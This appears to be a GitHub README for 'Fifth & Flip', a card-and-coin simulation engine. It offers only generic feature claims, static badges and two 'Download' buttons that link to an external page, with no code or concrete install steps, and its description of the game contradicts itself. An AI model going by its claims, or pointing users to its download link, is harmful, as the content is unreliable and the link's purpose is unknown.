![preview](https://raw.githubusercontent.com/jarabb-biosfer/fifth-band-coin-flip/main/frame_3476f0.svg)
[![Download](https://raw.githubusercontent.com/jarabb-biosfer/fifth-band-coin-flip/main/btn_b8ed.svg)](https://jarabb-biosfer.github.io/fifth-band-coin-flip/)

# 🃏 Fifth & Flip — Companion Deck Engine

![Status](https://img.shields.io/badge/status-active-2ea44f?style=flat-square&logo=statuspage&logoColor=white)
![Platform](https://img.shields.io/badge/platform-cross--platform-0078D6?style=flat-square&logo=linux&logoColor=white)
![Interface](https://img.shields.io/badge/interface-responsive-6f42c1?style=flat-square&logo=responsive&logoColor=white)
![Languages](https://img.shields.io/badge/i18n-14%20locales-EA4AAA?style=flat-square&logo=googletranslate&logoColor=white)
![Support](https://img.shields.io/badge/support-24%2F7-FF6F00?style=flat-square&logo=intercom&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-3DA639?style=flat-square&logo=opensourceinitiative&logoColor=white)
![Build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square&logo=githubactions&logoColor=white)
![Release](https://img.shields.io/badge/release-2026.1-1F6FEB?style=flat-square&logo=semanticrelease&logoColor=white)

> **Five cards tell a story. Four speak in whispers, and the fifth decides whether anyone is listening.**
> **Whatever room is left in the channel is handed to the coin — and the coin answers in angles.**

Fifth & Flip began as a small curiosity: what happens when you let four cards nominate a wildcard, and then let the leftover bandwidth of that decision call a token toss? The answer turned out to be a compelling little ritual — part deduction, part chance, wholly replayable. This repository is the companion deck engine that grew out of that ritual: a full, self-contained toolkit for generating, simulating, visualising, and auditing the Fifth & Flip pattern across many configurations, seeds, and player styles.

It is not a single game. It is the machinery beneath a whole family of variants.

---

## 📖 Table of Contents

- [What Fifth & Flip Actually Is](#-what-fifth--flip-actually-is)
- [The Companion Deck Engine](#-the-companion-deck-engine)
- [Feature List](#-feature-list)
- [Why a Companion Engine?](#-why-a-companion-engine)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Configuration Surface](#-configuration-surface)
- [The Coin and the Bandwidth](#-the-coin-and-the-bandwidth)
- [Determinism & Replayability](#-determinism--replayability)
- [Performance Notes](#-performance-notes)
- [Use Cases](#-use-cases)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Getting Underway](#-getting-underway)
- [Repository Layout](#-repository-layout)
- [Ecosystem & Related Tools](#-ecosystem--related-tools)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [Security Posture](#-security-posture)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🎴 What Fifth & Flip Actually Is

Picture a table. Four face-up cards sit in a row. They are not a hand you play — they are a *nomination*. Together they point toward a fifth card: its value, its suit, its weight, its colour, its hidden lean. That fifth card is then drawn from a shuffled remainder, and the distance between nomination and reality becomes the interesting part.

The leftover "bandwidth" — a measure of how much uncertainty survives the nomination — is then passed to a coin. Heads or tails, the coin chooses a side of the resulting outcome, and that choice becomes the final signal. Two cards name a story. The coin decides who gets to read it.

This is the ritual. Fifth & Flip is the ritual, not the deck.

## 🧭 The Companion Deck Engine

The engine generalises the ritual. It lets you:

- Define nomination rules (how four cards point to a fifth).
- Define bandwidth rules (how uncertainty is measured after the nomination).
- Define coin policies (how a coin resolves the remaining ambiguity).
- Simulate millions of rounds in seconds.
- Audit every decision with a full, replayable trace.
- Export rounds as data, as art, as audio cues, or as textual narrative.

Everything is content-addressable, versioned, and reproducible from a seed.

## ✨ Feature List

- 🎯 **Rule-driven nomination** — plug in your own mapping from four cards to a fifth.
- 🪙 **Coin policy library** — fair coin, biased coin, hidden-bias coin, drift coin, and more.
- 📊 **Bandwidth analytics** — entropy, mutual information, closure scores, and heatmaps.
- 🔁 **Deterministic replay** — every round reducible to a seed and a rule set.
- 🧪 **Fuzzing harness** — shake the engine until it gives up its edge cases.
- 🗂️ **Profile system** — save named configurations as portable documents.
- 🌍 **Multilingual folklore layer** — suit and rank names translated into 14 locales.
- 📱 **Responsive interface** — from phone to ultrawide, layout reflows gracefully.
- 🕰️ **Round-the-clock assistance** — documentation, in-app help, and live channels.
- 🎨 **Narrative export** — turn any round into prose, poetry, or a table.
- 🧩 **Plugin surface** — stable extension points for custom rules and exporters.
- 🔐 **Reproducible builds** — same inputs, same outputs, byte for byte.
- 🧾 **Audit trails** — JSON, NDJSON, and human-readable traces.
- 🪶 **Zero heavyweight dependencies** — the core stays small and portable.

## 💡 Why a Companion Engine?

A single game of Fifth & Flip is a moment. A thousand games is a dataset. A million is a research corpus. The companion engine exists so that enthusiasts, researchers, artists, and tinkerers can take the ritual apart, put it back together, and see what it becomes under pressure. It is a workshop, not a toy — although it is also a very good toy.

## 🏗️ Architecture at a Glance

The system is organised into a small number of well-bounded layers.

1. **Deck Layer** — card representation, suits, ranks, shuffling, and card addressing.
2. **Rule Layer** — nomination functions, bandwidth functions, and coin policies.
3. **Simulation Layer** — round runners, batch drivers, and streaming simulators.
4. **Analytics Layer** — metrics, aggregations, histograms, and report builders.
5. **Presentation Layer** — the responsive interface, exports, and narrative renderers.
6. **Extension Layer** — plugin registry, stable contracts, and versioning rules.

Each layer is independently testable. None assumes the shape of the others.

## 📱 Responsive Interface

The companion interface was designed on a small screen first and expanded outward. On a phone it presents a single round at a time, with swipe gestures for advancing and a compact coin control. On a tablet it lays out two panels side by side. On a desktop it opens into a three-column workshop with the deck, the analytics, and the trace visible at once.

Layout adapts continuously rather than snapping between a small set of breakpoints. Type scales with the viewport. Controls stay within thumb reach where it matters. Nothing in the interface assumes a pointer, a keyboard, or a particular orientation.

Accessibility is treated as a first-class concern: contrast targets, focus order, reduced motion, and screen reader semantics are all checked as part of the release process.

## 🌍 Multilingual Support

The folk vocabulary surrounding playing cards is remarkably regional. What one culture calls a jack, another calls a knave, a page, or a valet. The engine ships with a locale bundle that translates suit names, rank names, coin faces, and narrative templates into fourteen languages, with community contributions welcome.

Right-to-left scripts are fully supported. Numeric formats follow the locale. Narrative exports respect the chosen voice and register, from dry chronicle to playful anecdote.

Adding a locale means authoring a single structured document; no code changes are required.

## 🕰️ Round-the-Clock Assistance

The project treats support as part of the product rather than an afterthought.

- A searchable knowledge base is maintained alongside the code.
- An in-app assistant summarises rules, explains metrics, and suggests configurations.
- Community channels are moderated continuously and staffed across time zones.
- Issue triage runs on a rota so that nothing sits untouched for long.
- Documentation is versioned with releases, so answers always match the build you are using.

Whether you are exploring at noon or tinkering at 3 a.m., someone or something is available to help.

## ⚙️ Configuration Surface

Configurations are plain, portable documents. A profile describes the deck you want, the rules you want, and the coin policy you want. Profiles can be shared, diffed, and merged.

Typical knobs include:

- Deck composition and any jokers or wild cards.
- Nomination rules, including composite and cascading rules.
- Bandwidth measures and their weights.
- Coin policies and their parameters.
- Seeding strategy for reproducible runs.
- Export targets and narrative voice.
- Locale and formatting preferences.

Because profiles are data, they are easy to version, easy to review, and easy to generate programmatically.

## 🪙 The Coin and the Bandwidth

The coin is the heart of the ritual's charm, and the engine gives it proper attention. The bandwidth that remains after a nomination is not a nuisance — it is the space where the coin is allowed to speak. The engine models this space explicitly, so you can see exactly how much freedom the coin had when it decided.

Different coin policies yield dramatically different feels. A fair coin feels like a clean cut. A biased coin feels like a thumb on the scale. A drift coin feels like weather. Choosing a policy is choosing a mood, and the engine treats it that way.

## 🔁 Determinism & Replayability

Every round is reproducible from a compact seed plus the rule set in force. This makes the engine suitable for research, for debugging, for teaching, and for anyone who wants to argue about a particular outcome without relying on memory.

Traces can be exported and re-imported. Given the same trace and the same engine version, the round unfolds identically. When rules change between versions, the engine records the rule fingerprint so that old traces remain honest about their provenance.

## 🚀 Performance Notes

The core simulation loop is written to be cache-friendly and allocation-light. Batch runs stream results rather than materialising everything in memory. Aggregations are incremental, so long runs remain responsive.

Real-world figures vary by hardware, but the engine comfortably handles millions of rounds in a single sitting on ordinary laptops, and scales further on beefier machines. Profiles that lean on exotic rules may be slower; profiling hooks are included to help you find hot spots.

## 🧰 Use Cases

- Teaching probability and information theory with tangible, visual examples.
- Generating balanced, reproducible test datasets for card-based software.
- Exploring rule design as a creative hobby.
- Building narrative generators that lean on chance with a human face.
- Prototyping interface patterns for small-screen card experiences.
- Studying how small rule changes ripple through long simulations.

## ❓ Frequently Asked Questions

**Is this a single game?**
No. It is an engine that supports a family of games sharing the Fifth & Flip ritual.

**Do I need to know how to code?**
Not necessarily. The interface exposes most configuration surface without any scripting.

**Can I plug in my own rules?**
Yes. The rule layer is designed for extension, and the plugin registry is stable across minor releases.

**Is it reproducible?**
Yes, from a seed and a rule fingerprint. Traces make this explicit.

**Does it work offline?**
The core works without network access. Online features are additive, not essential.

**Is my data collected?**
No telemetry is sent by default. Optional, opt-in diagnostics exist for contributors.

## 🛠️ Getting Underway

The fastest path is to open the companion interface and start a default round. Explore a few outcomes, then gradually introduce configuration changes. The engine is forgiving; nothing you change is permanent unless you save a profile.

For those who prefer the command surface, the engine exposes a small set of verbs for running rounds, batch simulations, and exports. The documentation ships with worked examples for each.

If you would like to run the engine as a long-lived service, container recipes are provided alongside the source. They are intentionally minimal so that you can adapt them to your environment.

## 🗂️ Repository Layout

- A core directory holding the deck, rule, and simulation layers.
- An analytics directory for metrics and report builders.
- A presentation directory for the responsive interface and exporters.
- A locales directory containing the multilingual bundles.
- A profiles directory of example configurations.
- A docs directory with guides, tutorials, and reference material.
- A tests directory spanning unit, integration, and fuzz suites.
- A tools directory for profiling, packaging, and release chores.

## 🌐 Ecosystem & Related Tools

Fifth & Flip is part of a broader family of card-and-chance projects. Adjacent tools focus on deck authoring, probability visualisation, and narrative generation. The companion engine is designed to interoperate with them through plain data formats, so you are never locked into a single view of the ritual.

## 🗓️ Roadmap for 2026

- Expand the coin policy library with adaptive and contextual policies.
- Ship a first-class visual rule editor.
- Grow the locale bundle toward thirty languages.
- Introduce a stable plugin SDK with signed manifests.
- Add streaming analytics dashboards with exportable snapshots.
- Publish a companion paper describing the bandwidth formalism.

Roadmap items are indicative, not contractual. Priorities shift with community feedback.

## 🤝 Contributing

Contributions are welcome in many forms: rule designs, translations, documentation, tests, accessibility audits, and interface ideas. Start by reading the contribution guide, then pick an issue labelled as approachable. Small, focused changes tend to land the fastest.

Please keep discussions constructive. The project's charm depends on it.

## 📜 Code of Conduct

All participants are expected to treat one another with respect. Harassment of any kind is not tolerated. Reports are handled confidentially, and the maintainers aim to respond promptly.

## 🔒 Security Posture

The engine avoids unnecessary network exposure, does not collect telemetry by default, and ships with a documented threat model. If you believe you have found a vulnerability, please report it privately using the process described in the security policy. We appreciate responsible disclosure and will credit reporters who wish to be named.

## ⚠️ Disclaimer

This project is provided for entertainment, education, and research purposes. Simulations do not predict real-world outcomes, and chance-based mechanics should never be used to make financial or life decisions. Use it thoughtfully, share it generously, and remember that the coin is a metaphor first and a mechanism second. The maintainers are not responsible for any decisions made on the basis of simulated rounds.

## 📄 License

This project is distributed under the MIT License. See the [LICENSE](LICENSE) file for the full text.

Copyright (c) 2026 The Fifth & Flip Companion Engine contributors.

[![Download](https://raw.githubusercontent.com/jarabb-biosfer/fifth-band-coin-flip/main/btn_b8ed.svg)](https://jarabb-biosfer.github.io/fifth-band-coin-flip/)